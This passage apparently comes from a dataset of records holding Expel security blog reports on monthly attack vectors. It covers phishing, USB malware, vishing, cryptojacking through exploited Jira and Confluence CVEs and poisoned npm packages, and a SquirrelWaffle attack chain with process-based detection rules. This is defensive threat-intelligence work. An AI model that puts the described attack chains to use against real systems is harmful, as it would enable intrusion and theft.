reappearance, including: Removable media Use of valid credentials for cloud identity providers Public-facing exploitation of Log4j Cryptojacking Phishing with credential harvesters An important step to protect against many of the above: deploy phish-resistant MFA (FIDO security keys) everywhere you can. This is particularly important to make sure threat actors dont gain access to your SSO tools and all of the sensitive apps and data they provide access to. While only involved in one incident we investigated in February, it was telling to see the Log4j vulnerability continuing to be exploited against public-facing systems. This vulnerability will remain relevant and should be examined during any vulnerability scans conducted in and against your digital environment. In terms of malware, AsyncRAT made up 15 percent of identified malware payloads from incidents we detected and responded to in February 2022. This open source remote administration tool was initially deployed using an ISO file and used a number of stages to eventually inject its final payload into the memory of a legitimate process. And lets not forget: removable media remained an important attack vector in February and threat actors continued to use unauthorized system access to deploy crypto mining software. The takeaway: attackers will return to the vectors and tactics they know work, even as new ones emerge. Phishing remained in the top spot for infection vectors in February. Two key trends stood out: first, threat actors using the ability to register an adobe.com subdomain through Adobe Campaign to give their emails a sense of legitimacy. Attackers hope the association with adobe.com will make their victims more likely to click links in the email and follow through on downloading malicious files or entering credentials. Users should check sender addresses and URL pathways (without clicking) and check with colleagues through verified channels if theyre expecting to collaborate on Adobe-based projects. When in doubt, its always better to forward potential phishing emails to your security team for investigation. The other phishing trend we observed involved cryptocurrency  specifically, threat actors requesting crypto transfers by pretending to solicit donations related to the war in Ukraine. While Ukraine has legitimately raised $35 million in cryptocurrency donations , threat actors are trying to take advantage of the crisis for personal financial gain. The verified crypto wallet addresses for donations to Ukraine can be found on the countrys official Twitter account . Details for other organizations should be confirmed through verified external sources before any financial information is provided. Well be back with more attack vectors insights and threat data  but were changing things up! Our threat reports are going quarterly so we can provide more data on what were seeing, highlight detection opportunities, and dive further into resilience recommendations that can protect your org. Expect to see our first quarterly threat report in May. If you read our Great eXpeltations annual report , thats a hint of whats coming your way! In the meantime, have questions about this months data or what it means for your org? Drop us a note , were happy to chat.'}) (input_keys={'title'}),
  Example({'title': 'Top Attack Vectors: January 2022', 'url': 'https://expel.com/blog/top-attack-vectors-january-2022/', 'date': 'Feb 17, 2022', 'contents': 'Subscribe  EXPEL BLOG Top Attack Vectors: January 2022 Security operations  6 MIN READ  BRITTON MANAHAN, SIMON WONG AND HIRANYA MIR  FEB 17, 2022  TAGS: MDR Were often asked about the biggest threats we see across the incidents we investigate for our customers. Where should security teams focus their efforts and budgets? To answer these questions, were sharing monthly reports on the top attack vectors, trends, and resilience recommendations identified by our security operations center (SOC). Our goal is to translate the security events were detecting into a security strategy for your org. For this report, our SOC analyzed the incidents we investigated in January 2022 to determine the top attack vectors used by threat actors. Heres what stood out this month: USB flash drives continuing to pose a malware threat Threat actors taking advantage of the wide range of malware at their disposal Phishing attempts using fake antivirus invoices and CEO impersonation Keep reading for details and our tips for what to do about all the above. Removable media remains a threat TL;DR: Removable media, in particular USB-based storage devices, are still a relevant threat to your environment. In January 2022, removable media were responsible for nine percent of all incidents we responded to. That increases to 20 percent for incidents where the initial infection vector involved a physical endpoint (in other words, removing incidents involving a cloud-based service). While security awareness training has focused on USB devices for years and some orgs require approval per-device before connecting them to a company-owned asset, these devices continue to be used in business environments because of their convenience. And usage doesnt just apply to known and trusted USB devices. In fact, a 2016 study examining what people would do if they found a USB in a parking lot showed that nearly 50 percent of people would plug an unknown USB device into their computer. While human curiosity and impulse is likely just as high in 2022, maybe we can hope the rise of remote work has made the discovery of office parking lot USBs less likely? With that said, even trusted USB devices are often infected with malware variants that search for external storage devices connected to a victim host to infect them and spread further. This risk is much greater for endpoint users who can transfer USB devices from personal devices to business assets. In January 2022 alone, we saw the AsyncRat, Valyrian, Gamarue, Agent Tesla, and Forbix malware families attempt to spread through USB storage devices. We also saw additional generic malicious worms including one deployed as a hidden VBScript script file on the device. Its highly likely that these malware variants would have tried to infect any other external USB storage devices attached to these systems had they achieved their initial infection without detection. Resilience recommendations: Consider blocking external USB storage devices by default in your environment, with approval required for use. Make sure your security awareness training includes sections on the dangers of external USB storage devices. If supported, have your antivirus software or endpoint detection and response (EDR) tech scan any externally-connected USB storage devices. If possible, disable the AutoRun feature for USB flash drives in Windows-based operating systems. The AutoRun feature allows staged malware on USB devices to execute without additional interaction as soon as the device is plugged in. A variety of variants TL;DR: Threat actors are deploying a wide range of malware variants, frequently with the common goal of achieving remote system access. In January 2022, no single malware variant dominated the landscape of identified payloads among incidents we responded to. Heres a list of malware variants we identified, with no variant making up more than 15 percent of the total: Agent Tesla AsyncRAT ChromeLoader Conflicker CryptoWall Forbix Gamarue Gootkit Gozi Socgholish Valyrian In addition to these malware families, we also observed: A generic VBScript and PowerShell-based script used for command and control that we werent able to attribute to a particular malware family. A legitimate crypto miner deployed for cryptojacking. Legitimate remote access software deployed for remote interactive desktop access. Two instances of a malicious Chrome extension (ChromeLoader) being installed. A ransomware sample. This wide variety of malware and payloads demonstrates the abundance of malicious software and tooling at threat actors disposal. The continual economic incentives of cybercrime guarantee that malware families and their variants will continue to evolve. Most of the malware samples listed above established a connection to a remote command and channel, though they took different obfuscated paths and stages to reach that point in their execution. Regarding initial infection vectors, we also observed a variety of techniques to deploy these malware variants, including: Removable media Web delivery JavaScript file Phishing Macro-enabled Microsoft Office doc To sum it up: the info in this section shows that defenders need to make sure they dont hyperfocus on any particular malware variant or specific tool or technique used by threat actors, but rather focus on a layered approach to security that can detect and prevent the varied and continually evolving malware landscape. Regarding identification of samples you may encounter, open source intelligence (OSINT) tools for malware are a great way to identify a malware family without needing a full-time malware reverse engineer on your staff. Resilience recommendations: Confirm your endpoint detection and response (EDR) coverage across all of your endpoints. Implement layered security controls across your environment to detect and prevent evolving threats. Perform a penetration test against your environment to evaluate your current security posture. Subscribe to OSINT feeds to stay up-to-date on malware trends and leverage this intelligence in your deployed security tech. Phishing TL;DR: We saw an increase in fake Norton invoices and CEO impersonations emails in January 2022. We reviewed over five thousand potentially malicious email submissions in January 2022, and identified two phishing trends using the following techniques: Fake Norton invoices We noticed an increase in the number of emails containing bogus Norton invoices for Norton Antivirus software purchases. The invoices generally include a phone number to call if you have questions about your recent transaction. These emails usually come from spoofed sender addresses that appear as if theyre from Norton Security or other legitimate businesses that sell Norton Security products, like GeekSquad. Weve also seen threat actors use the QuickBooks platform to give the email legitimacy. Threat actors aim to persuade recipients to call the phone number provided, then plan to scam victims out of money by requesting a payment method for the invoiced amount. They also may try to make recipients install third party remote tools that grant access to their computers. Fake Norton invoice using QuickBooks platform CEO impersonation Because info about CEOs is usually widely available online, CEO impersonation is a common occurrence and effective tactic for attackers. Most CEO impersonation email submissions convey a sense of urgency in the emails body and subject. Here are a few phrases that weve come across: Email subject: URGENT Confidential available ? Quick Response Email body: Do you have some spare time to handle a quick task? Email me on here once you get this I need a task done ASAP and look forward to my text Your immediate response will be highly appreciated Impersonation emails also tend to spoof an external account to make it seem like the email is coming from the organizations CEO. Attackers then often like to move the conversation away from email to lower the chance of being discovered. Asking for cell phone numbers allows them to use calls or texting for further interactions. Threat actors will usually ask victims to purchase gift cards and send pictures of the redemption codes. Resilience recommendations Conduct regular security awareness training for employees, including phishing simulations. Dont click on any links in a potentially suspicious email. Double check the senders address and return path for suspicious emails. Use open source tools to verify if a provided phone number is actually associated with the supposed sender. Block access to malicious websites. Use a verified internal channel (for example, a phone call to a verified company phone number or a message on your companys internal messaging platform) to confirm if the communication/request in the email is legitimate and expected. Remove the email from a users inbox if its determined to be a phishing attempt. Takeaways Phishing remained in the top spot for infection vectors in January, but we also saw a wide variety of malware and an old friend  the USB flash drive threat  make a return. While many of us may assume the days of bumping into a random flash drive in the office parking lot are over, these devices remain a target for threat actors. Its important to remember that USB devices allow threat actors to use a variety of malware families to gain access to additional systems. Many malware variants can continually search an infected system for connected external USB storage devices and infect them, as well. Companies should have security controls in place to block endpoint users from inserting USB flash drives previously connected to personal assets into company assets, and only allow approved storage devices for company assets. Speaking of malware, we also saw a range of malware families this month, identifying 11 families across payloads for incidents we responded to. And no single family made up more than 15 percent of the total number of malware samples. We also identified a malicious Chrome browser extension and artifacts from a ransomware sample. With such a variety of tools at their disposal, attackers are clearly deploying a variety of tactics to achieve their goals. While these malware families used different obfuscation and payload stages, the most common end goal was establishing a command and control network communication channel back to the attacker. Companies should make sure that they have complete coverage of their endpoint security controls across all of their devices, and consider subscribing to OSINT malware feeds. Phishing remains as effective of a tactic as ever, with two particularly notable trends in January. Threat actors are sending convincing Norton Antivirus invoices to trick users into paying them. This social engineering scheme continues over the phone after users who received the email call the number provided, when threat actors will typically request payment information. Threat actors are also sending fake emails appearing to come from a companys CEO. These emails rely on urgency to hopefully prevent targeted employees from taking the time to verify features of the email that would point out it isnt legit. Its essential to regularly conduct security awareness training for employees to help them identify indicators of a phishing attempt. Well be back with insights on Februarys top attack vectors. In the meantime, have questions about this months data or what it means for your org? Drop us a note .'}) (input_keys={'title'}),
  Example({'title': 'Top Attack Vectors: July 2021', 'url': 'https://expel.com/blog/top-attack-vectors-july-2021/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG Top Attack Vectors: July 2021 Security operations  5 MIN READ  JON HENCINSKI  AUG 13, 2021  TAGS: MDR Were often asked about the biggest threats we see across the incidents we investigate for our customers. Where should security teams focus their efforts and budgets? To answer these questions, were sharing monthly reports on the top attack vectors, trends, and resilience recommendations identified by our Security Operations Center (SOC). Our goal is to translate the security events were detecting into security strategy for your org. For this report, our SOC analyzed the incidents we investigated in July 2021 to determine the top attack vectors used by bad actors that month. Well dive into the trends were seeing in two important arenas: phishing and malware. Phishing Business Email Compromise (BEC) in O365 is still public enemy number one. TL;DR: BEC attempts in Microsoft Office 365 (O365) launched from phishing emails were the top threat in July. Follow @jhencinski Nearly 65 percent of incidents we identified were BEC attempts in O365  up slightly from June, when BEC attempts in O365 accounted for 53 percent of incidents we identified. Threat actors behind these campaigns create phishing emails with links to credential harvesting sites impersonating webmail login portals. After the victim enters their credentials, the threat actor can use these credentials to access the victims email  potentially opening a treasure trove of sensitive information. Of note, we didnt identify a BEC attempt in Google Workspace in July. While Googles Workspace security settings are pretty straightforward and proficient out-of-the-box, O365 has some initial configurations that must be changed by default to improve security (listed below), otherwise leaving opportunities in play for bad actors. We expect the trend of O365 BEC attempts to continue and were monitoring Microsofts plan to do away with Basic Authentication by the end of 2021. Resilience recommendations: Ensure that youre enabling MFA wherever possible Disable legacy protocols like IMAP and POP3 Implement extra layers of conditional access for your riskier user base and high-risk applications Consider Azure Identity Protection or Microsoft Cloud App Security (MCAS) BEC isnt just about access to email. Protect your cloud identity providers too! Were seeing an increase in the number of attacks targeting cloud access identity providers this year. By attacking these providers, threat actors gain access to SSO credentials and, through them, application data. Nearly 100 percent of the attacks on cloud identity providers we identified in July targeted Okta credentials , a popular SSO technology. Resilience recommendations: Phish resistant MFA (fido/webauthn) Enforce MFA prompts when users connect to sensitive apps via app-level MFA Customize your Okta sign-in page appearances Watch out for voice-phishing, aka vishing, attacks. In July, our SOC responded to a remote access scam incident where an employee received a phone call from a scammer pretending to be from the orgs help desk. The employee was instructed to download and install software that allowed the scammer to access and remotely control the employees desktop computer. At this point, the employee sensed something was amiss, hung up the phone and contacted their security team directly (good call!). We typically spot these attacks by monitoring for the installation of remote access software thats atypical for an org. In these scenarios, the scammer is after credit card information. They typically have the victim deploy legitimate remote access software, then take control of the victims computer and give the appearance that their machine is infected with viruses. At that point, they ask for the victims credit card information to clean up and repair their machine. Microsoft recently posted a blog describing a recent ransomware attack that used vishing to gain initial entry. Resilience recommendations: Block installation of remote access software thats not approved using A/V or EDR. Be suspicious of any phone calls received directly from someone claiming to be from your IT Help Desk. Its totally okay to call them back to verify if its legitimate, but make sure to use the help desk numbers provided by your company and not the caller. If you notice something suspicious, contact your IT Help Desk or security team. Malware Bad actors continue to favor user execution &gt; exploitation TL;DR: Youre far more likely to experience an incident from an employee unintentionally self-installing malware or running an evil macro than from an unpatched vulnerability. Deployment of widely distributed commodity malware on Windows-based computers accounted for 17 percent of incidents that we responded to in July. Commodity malware includes droppers, programs to steal employee information, coin miners and banking Trojans. Only one opportunistic malware incident in July was the result of a software vulnerability. The rest? Techniques that required user execution. Examples: Zipped JScript files, Zipped Windows Executables and Microsoft macro-enabled Word documents. These arent exploits. This is feature abuse. While we certainly recommend staying up-to-date with the latest OS and software updates, orgs need to evaluate and control the double click attack surface. Its worth noting that we didnt identify an incident where malware was deployed to a Google Chromebook or macOS-based computer in July. All of the commodity malware incidents we identified in July involved a Windows-based computer. We fully expect the trend of threat actors favoring user execution over exploitation to continue. Resilience recommendations: We know disabling Office macros isnt easy, but its worth exploring given their tendency to be exploited Consider associating WSH files with Notepad to mitigate common remote code execution techniques Disable Excel 4.0 macros WordPress security and its ecosystem have improved over the years, but its still an attack vector. In July, our SOC stopped a ransomware attack at a large software and staffing company. The attackers compromised the companys WordPress CMS and used the SocGholish framework to trigger a drive-by download of a Remote Access Tool (RAT) disguised as a Google Chrome update. In total, four hosts downloaded a malicious Zipped JScript file that was configured to deploy a RAT, but we stopped the attack before ransomware deployment and helped the organization remediate its WordPress CMS. Keep up to date on patches, but also consider the resilience recommendations below. Resilience recommendations: Run trusted and well-known WordPress plugins Follow a WordPress hardening guide or install a WordPress security plug-in Explore implementing or updating your website Content Security Policy to block malicious scripts MFA everything and all users Lock down your dev and staging instances, too (including adding MFA) Run an IR tabletop exercise where the initial entry point is your WordPress site Takeaways The wave of ransomware news this summer and the growing trend of bad actors deploying malware using techniques that require user execution highlights the need for orgs to guard themselves against future ransomware incidents (see our recommendations here ). That being said, phishing (and particularly BEC through O365) was by far the most frequent threat we investigated in July, and we expect it to remain that way. Preventing BEC and credential harvesting through phishing and vishing should be a priority for resilience efforts. Orgs should stay up-to-date on the latest phishing trends to update their policies and educate their employees when new tactics are at play. And our top recommendation to protect against BEC in O365 and account takeover? MFA, MFA, MFA. Then consider taking some of the additional resilience actions weve discussed, like disabling legacy protocols, adding extra layers of conditional access and deploying additional security tools like Azure Identity Protection and MCAS. Well be back with insights on Augusts top attack vectors. In the meantime, have questions about this months data or what it means for your org? Drop us a note .'}) (input_keys={'title'}),
  Example({'title': 'Top Attack Vectors: November 2021', 'url': 'https://expel.com/blog/top-attack-vectors-november-2021/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG Top Attack Vectors: November 2021 Security operations  7 MIN READ  KYLE PELLETT  DEC 14, 2021  TAGS: MDR Were often asked about the biggest threats we see across the incidents we investigate for our customers. Where should security teams focus their efforts and budgets? To answer these questions, were sharing monthly reports on the top attack vectors, trends, and resilience recommendations identified by our Security Operations Center (SOC). Our goal is to translate the security events were detecting into a security strategy for your org. For this report, our SOC analyzed the incidents we investigated in November 2021 to determine the top attack vectors used by bad actors. Heres whats ahead: A rise in phishing emails linking to malicious macro-enabled Microsoft Office docs, ultimately targeting financial accounts A breakdown of cryptojacking and the latest tactics were seeing What to do about all the above Evil macros used to deploy SquirrelWaffle TL;DR: 25 percent of the commodity malware incidents we investigated in November were attempts to deploy SquirrelWaffle. In November, we observed a 10 percent increase in commodity malware incidents resulting from phishing emails containing links to download malicious macro-enabled Microsoft Office or Excel documents. We attributed most of this activity to SquirrelWaffle, a malware loader. One in four commodity malware incidents were attempts to deploy this family of malware. This is a substantial increase from previous months and we expect this trend to continue. A typical attack chain to deploy SquirrelWaffle looks like the following: An employee receives a phishing email containing a seemingly innocuous link and an urgent call to action If the employee clicks the link, they receive a ZIP file with an embedded macro-enabled Office or Excel document The document instructs the employee to enable macros (red flag!) If the employee enables macros, this initiates the SquirrelWaffle infection process SquirrelWaffle is then typically used to deploy additional malware to an infected host To date, weve seen that SquirrelWaffle often downloads a variant of the Qakbot banking trojan to scrape the victims machine for sensitive financial data and send it back to the attackers. SquirrelWaffle can also load more insidious malware like CobaltStrikes Beacon agent, a post-exploitation attack emulation tool thats popular among cybercrime and ransomware groups. Notable: We integrate with many Endpoint Detection and Response (EDR) technologies and have identified a trend where SquirrelWaffle executes at least partially, regardless of the EDR in use. Heres an example. In a recent investigation involving a Windows 10 host with an EDR agent, an employee downloaded a malicious ZIP file with an embedded Office document and then enabled macros. This kicked off the SquirrelWaffle infection process. The evil macro was configured to download and execute evil Windows DLL files on the infected host. Shortly after, we detected process activity on the infected host consistent with reconnaissance. At this point in the attack, the EDR agent terminated the evil process. Heres what that looks like from a defenders perspective: Endgame process tree view of SquirrelWaffle resulting in second stage payload execution. Whats the goal here? In most cases, the goal is to scrape the infected host for credentials, including financial account information. When a host is infected, attackers gain access to that victims contact list and can use their compromised accounts to play on trust between the account owner and their contacts to enable further infections. How to detect SquirrelWaffle: Alert when you see an Excel process spawn Regsvr32.exe to load DLL files in C:Datop For a broader approach, alert when you see an Excel process spawn Regsvr32.exe Alert when you see Regsvr32.exe execute with references to .good or .text files within the process arguments Alert when you see Microsoft Remote Assistance (msra.exe) spawn process typically associated with recon (whoami.exe, arp.exe) and its parent process is Regsvr32.exe Heres an example of a SquirrelWaffle alert in the Expel Workbench: Expel Workbench process tree lineage of SquirrelWaffle: Outlook -&gt; Excel -&gt; Regsvr32 Resilience recommendations: Block Microsoft Office macros and Excel 4.0 macros as theyre a popular target to exploit with malware. While macros may offer some productivity improvements, if you can live without them, its best to disable them entirely. We know its a tall order, but spend time educating your users on how to spot phishing emails and suspicious links or attachments. Various exploits used to deploy coin miners TL;DR: Routes of infection vary, but attackers end goal remains the same: deploying crypto mining software. Weve now brought up cryptojacking in a few of these reports. So you may be asking yourself, what is cryptojacking and why should I care? Thats a totally fair question. The quick answer is that attackers want to use other peoples computing resources to do computational work to earn cryptocurrency and profit. Crypto mining generally isnt profitable when you factor in operational costs  it requires tons of energy and resources to earn cryptocurrency this way. But if attackers can cut costs by using other peoples resources (electricity, internet and primarily processing power), it can become profitable. Consider this metaphor  youre a hard working gold panner in your local creek. Youve been panning for gold for a year now and some days youre able to find a nugget and pay your bills for the month, but on average, you dont break even. In fact, youre losing money gambling on your luck, which is also dependent on how many hours you put into the actual work of wading into the water and sifting through rocks and sand. But what if you could convince your neighbors to also spend their days panning for gold in their creeks and send you the nuggets? Your problem would be solved! Except that no one would actually do that since theres nothing in it for them. Which is what cryptojacking boils down to  taking advantage of other peoples resources without their permission so you profit. So how does this happen in a digital world? Primarily by taking advantage of vulnerable servers on cloud infrastructure. Were typically alerted to a cryptojacking operation by an alert for network traffic patterns that we know resemble crypto mining. Well see lots of outbound traffic to a miner pool, which is essentially the digital river from our metaphor where people send their cryptographic hashes and try to get a reward. Our investigations typically lead us back to an exploited vulnerability on a public-facing web server. Here are some of the specific tactics weve seen recently: Public Amazon S3 buckets are a necessary storage option used regularly by AWS cloud customers. This also makes them a popular target for attackers. Bad actors scan the contents of these buckets for valuable access keys and other identifiable information that shouldnt be public. These data leaks can occur if proper S3 bucket access controls arent implemented. In one instance, attackers gained access to AWS through credentials that were mistakenly made publicly available. The first thing the attackers did was run new EC2 instances (virtual servers hosted on AWS) in our customers AWS environment and begin crypto mining. Notably, they didnt attempt any other exploitation  we suspect they didnt want to set off alarms, so took the shortest path to begin crypto mining as quietly as possible. Going unnoticed while their operations run is the ideal scenario for cryptojacking attackers. So what coin miners do we typically see? A lot of XMRig to mine Monero. But on rare occasions, we see a coin miner deployed alongside advanced malware that not only mines coins but also steals access keys and spreads within an organizations cloud environment. In November, we observed the crypto mining TNT Worm (which is also able to steal AWS access keys) on a customers demo EC2 instance within minutes of being turned on. We suspect this EC2 instance was compromised because it hadnt been regularly updated since it was for demo purposes and wasnt frequently active. This worm has remained prevalent, consistently taking advantage of misconfigured systems. The worm also has an interesting greedy characteristic  it attempts to identify if there are any other miners running on the infected hosts and disables any that are to ensure processing power and mining capabilities are dedicated to its mining operation. The TNT Worm is configured to spread itself by scanning for additional misconfigured Docker platforms and Kubernetes systems. In this incident, we identified the worm and provided remediation steps to our customer in seven minutes after evidence of crypto mining was identified. Our investigation didnt find evidence of AWS access key exposure. We suspect the TNT Worm prioritizes getting mining operations up and running before downloading additional scripts that attempt to propagate in the environment through AWS access keys. With regard to another crypto jacking infection pathway, this month also showed us that poisoning npm packages wasnt a one hit wonder. Last month , we discussed hijacked ua-parser and rc packages used to deploy crypto mining software. This month, we saw the popular coa package causing trouble for a few of our customers. Resilience recommendations: Regularly check and update outdated software on public-facing servers and maintain a consistent update regimen to keep up with newly discovered vulnerabilities. Follow security news and subscribe to threat intelligence feeds about current and past exploits to stay up-to-date on the latest targets. Implement network layer controls to detect and block network communications to cryptocurrency mining pools. Have computing resource alarms forwarded to your SIEM to alert your team of overtaxed resources deployed for cryptojacking. Implement access controls for Amazon S3 buckets. Scan and identify public-facing assets using Shodan . Confirm your endpoint detection and response (EDR) coverage across all of your endpoints. Takeaways One of the most notable trends our team detected this month was a 10 percent increase in commodity malware incidents resulting from phishing emails containing links to download malicious macro-enabled Microsoft Office and Excel documents  in most cases, SquirrelWaffle. If not detected and stopped, SquirrelWaffle typically downloads a banking trojan onto victims machines to compromise their financial accounts. Our top tip to combat this trend: disable Microsoft Office macros and Excel 4.0 macros since theyre such a popular target to exploit with malware. Then, spend time educating your users on how to spot and report phishing emails and suspicious links or attachments so theyre less inclined to click when that malicious scam comes through. And in case a user does fall for the phishing campaign, deploying SquirrelWaffle into your environment, consider the detection opportunities discussed above to catch it in its tracks. Another key trend weve mentioned before is that malicious cryptocurrency activity is on the rise this year. Attackers are using different methods of infection, but share the same end goal  cryptojacking, or using their victims computing resources to run crypto mining software. To keep miners out of your environment, make sure to keep your software up-to-date on public-facing servers and keep an eye out for newly discovered vulnerabilities. Also make sure to follow proper endpoint guidance, including EDR and patching. Additionally, tools that alert your operations team of overtaxed resources can also help your security team by indicating resources deployed for cryptojacking. Well be back with insights on Decembers top attack vectors. In the meantime, have questions about this months data or what it means for your org? Drop us a note .'}) (input_keys={'title'}),
  Example({'title': 'Top Attack Vectors: October 2021', 'url': 'https://expel.com/blog/top-attack-vectors-october-2021/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG Top Attack Vectors: October 2021 Security operations  6 MIN READ  BRITTON MANAHAN  NOV 10, 2021  TAGS: MDR Were often asked about the biggest threats we see across the incidents we investigate for our customers. Where should security teams focus their efforts and budgets? To answer these questions, were sharing monthly reports on the top attack vectors, trends and resilience recommendations identified by our Security Operations Center (SOC). Our goal is to translate the security events were detecting into a security strategy for your org. For this report, our SOC analyzed the incidents we investigated in October 2021 to determine the top attack vectors used by bad actors. In a month where we saw a wide variety of initial attack vectors, heres what stood out: Voice phishing (vishing) to convince end users to install remote access software Cybercriminals continuing to target cryptocurrency A phishing incident highlighting how social engineering remains so effective for attackers Read on to learn more and see our tips for what to do about all of the above. Voice phishing to deploy remote access software TL;DR: Bad actors are deploying legitimate remote access software to gain interactive access to endpoints. In October, around three percent of the incidents we investigated involved bad actors using social engineering to manipulate end users into installing legitimate remote access software, hoping to gain an entry point. By legitimate, we mean software that isnt inherently malicious but has functionality that bad actors can deploy for malicious purposes. Though not yet an alarming presence, we didnt see any incidents of this type in September, so were keeping an eye out for a potential trend. Octobers incidents featured several interesting details. They each involved a Windows endpoint, which had the Remote Desktop application built-in. And rather than trying to enable or re-configure the built-in app on the Windows endpoint, the bad actors tried to install alternative remote access software, likely to bypass any security controls implemented at the network level. Since the built-in Windows Remote Desktop application is such a well-known potential entry point for attackers, companies often have multiple security controls in place to prevent opening it up to external connections. For example, external outbound connections over port 3389, the port used by Windows Remote Desktop, are often blocked by perimeter network firewalls. Interestingly, both of these incidents also involved vishing (voice phishing), where bad actors posing as tech support spoke to end users over the phone and instructed them to download and install the remote access software. The remote access software used in these incidents included Screen Connect, AnyDesk and TeamViewer. Based on our investigations, it doesnt appear the attackers were focused on lateral movement or a larger network compromise, but rather on the individual endpoints they gained access to. This aligns with a conventional Windows Tech Support scam, where scammers target random phone numbers and act as tech support services to try to make end users install a remote access application. Once these attackers gain access to a system, theyve primarily searched common folder locations for sensitive information or for active banking sessions in the users web browsers. Resilience recommendations: Conduct regular security awareness training for your employees, including vishing and verifying calls or download requests supposedly from company IT/tech support. Consider restricting the ability to install non-allowlisted applications in your environment through an endpoint detection and response (EDR) tool or built-in tools like Microsoft Applocker . Assess your asset inventory management to make sure all of your endpoints are accounted for and in compliance with your security standards. Cybercriminals remain interested in cryptocurrency TL;DR: We continued to observe a rise in malicious activity related to cryptocurrency in October using multiple initial infection vectors. In October, half of the incident payloads we identified were found to be crypto mining software, up 11 percent from the previous month. This continued increase in malicious crypto mining activity overlaps with the global cryptocurrency market cap setting a new record of 2.7 trillion . In addition to exploiting public-facing vulnerabilities, bad actors also deployed crypto mining software as a web download and even a hijacked npm package. The hijacked npm package resulted from the compromise of a developer npm account for a popular JavaScript library, with this access then used to modify the library. This attack was particularly concerning because it impacted a popular and trusted programming library that was frequently downloaded during routine build and deployment processes for applications. This type of attack is also a prime example of why layered security is so essential for cybersecurity defense. Bad actors continue to find creative ways to deliver payloads  however, in this incident, the EDR tool deployed on the endpoint quickly alerted us about the resulting mining activity after the initial compromise. The increased monetary value of cryptocurrency is fueling not only this cryptojacking trend ( which we also discussed in September ), but also the trend of targeting crypto wallets . In fact, 25 percent of the malware payloads we identified in October had the ability to locate and extract information about cryptocurrency wallets. This means a grand total of 75 percent of Octobers identified payloads had capabilities for generating or stealing cryptocurrency. While crypto-focused attackers have included checks for popular cryptocurrency wallets (like Metamask) in their malware for a long time, theyve greatly increased their cryptocurrency wallet coverage to include the wide range of options that may be present on an endpoint. If an attacker can collect the private key from a cryptocurrency wallet, they can gain full access to any assets it contains. Resilience recommendations: Implement network layer controls to detect and block network communications to cryptocurrency mining pools. Have computing resource alarms forwarded to your SIEM to alert your team of overtaxed resources deployed for cryptojacking. House cryptocurrency in a hardware wallet disconnected from the internet. Scan and identify public-facing assets using Shodan . Confirm your endpoint detection and response (EDR) coverage across all of your endpoints. Phishing keeps the crown TL;DR: Phishing continues to be the constant in the world of cybersecurity. As long as it remains so accessible and successful for attackers, itll stay the number one threat. In October, 42 percent of the incidents we investigated were the result of phishing  down 19 percent from September, but still the most prevalent attack vector by far in a month when we observed a high variety of infection vectors. Microsoft Office 365 (O365) remains the primary phishing target, as all of the business email compromises (BECs) we saw this month involved the Microsoft email service. In addition to the social engineering activity we observed for deploying remote access software, another phishing incident in October highlighted why this strategy remains so successful for attackers. This incident wasnt particularly unique, but is a great example of the typical tactics used in a successful phishing attempt, detecting credential usage and the importance of multi-factor authentication (MFA). The end user received an email instructing them to click a link to check an urgent voicemail. After clicking the link, the user was redirected to a credential harvesting site configured to appear like a harmless request from Microsoft to re-verify the users credentials before granting access to their voicemail. The good news is that when the bad actor tried to use the harvested credentials, Azure AD Identity Protection alerted us about the login attempt, which was unsuccessful thanks to MFA on the account. Resilience recommendations: You know were going to say it  phish-resistant MFA (FIDO/webauthn) for everything and everywhere. Conditional access policies are a great way to help mitigate compromised logins through geo infeasibility. Disable legacy protocols like IMAP and POP3 (these dont enforce MFA). Consider Azure AD Identity Protection to help identify suspicious mailbox logins. Takeaways Bad actors are using social engineering through phone calls to convince users to install remote access software and configure it as an entry point into their endpoints. This is a prime example of legitimate applications being repurposed for malicious activity, making prevention more difficult. Application allowlisting and security awareness training can be your strongest defense against this particular type of social engineering threat. Cybercriminals also continue to target cryptocurrency as a way to maximize financial gains from their illicit activities. Cryptocurrencys digital nature, lack of regulation and surging market cap are driving forces behind this trend. Beyond deploying malware for cryptojacking, malware with information stealing functionality are now searching endpoints for a much wider range of cryptocurrency wallets to locate private keys. While many enterprise endpoints may not host cryptocurrency wallets, some companies have made headlines in previous months for adding cryptocurrency exposure to their balance sheets. Companies housing crypto wallets should protect these assets using a hardware wallet disconnected from the internet. And when it comes to cryptojacking, there are two essential things you should do for prevention and detection: first, make sure you dont have gaps in your EDR deployment coverage. Next, use computing resource alarms to monitor system health and alert your team of overtaxed resources potentially deployed for cryptojacking. Lastly, phishing and BEC remained the biggest threat and most frequent way a bad actor gained access to an environment in October, making up 42 percent of all incidents (with 100 percent of these incidents taking place in O365). Implementing phish-resistant MFA and disabling legacy authentication protocols are key steps to protect O365 accounts. Well be back with insights on Novembers top attack vectors. In the meantime, have questions about this months data or what it means for your org? Drop us a note .'}) (input_keys={'title'}),
  Example({'title': 'Top Attack Vectors: September 2021', 'url': 'https://expel.com/blog/top-attack-vectors-september-2021/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG Top Attack Vectors: September 2021 Security operations  5 MIN READ  BRITTON MANAHAN  OCT 14, 2021  TAGS: MDR Were often asked about the biggest threats we see across the incidents we investigate for our customers. Where should security teams focus their efforts and budgets? To answer these questions, were sharing monthly reports on the top attack vectors, trends, and resilience recommendations identified by our Security Operations Center (SOC). Our goal is to translate the security events were detecting into a security strategy for your org. For this report, our SOC analyzed the incidents we investigated in September 2021 to determine the top attack vectors used by bad actors. Heres whats ahead: How bad actors are exploiting public-facing vulnerabilities for crypto mining The PowerShell/DotNet combo bad actors are using for malware The growing Business Email Compromise (BEC) target that can give attackers access to a variety of apps What to do about all of the above Public-facing vulnerabilities and cryptojacking TL;DR: Threat actors are continuing to find and exploit public-facing vulnerabilities, with a focus on deploying cryptocurrency mining software. The exploitation of public-facing vulnerabilities continues to be a top infector vector for threat actors as this category made up 42 percent of the critical incidents we responded to in September. Of these incidents, 80 percent deployed the XMRig cryptocurrency mining software after the initial compromise. This program uses up a vast amount of the compromised systems resources as it tries to earn cryptocurrency for the threat actors before the softwares detected. This use of compromised computing assets for blockchain mining to earn rewards is known as cryptojacking. Securing potential entry points should be your first focus for preventing cryptojacking and other impactful attacker payloads. In September, we observed the following CVEs for these exploited web applications: CVE-2020-36239 Jira Data Center CVE-2021-26084 Confluence Server Next, system alerts for resource usage can serve a dual purpose for both your operations and security teams. These alerts are normally used by operations teams to automate monitoring system health, but the intense resource demands of cryptocurrency mining software makes it highly likely that cryptojacking will also activate alerts set up to detect when systems are 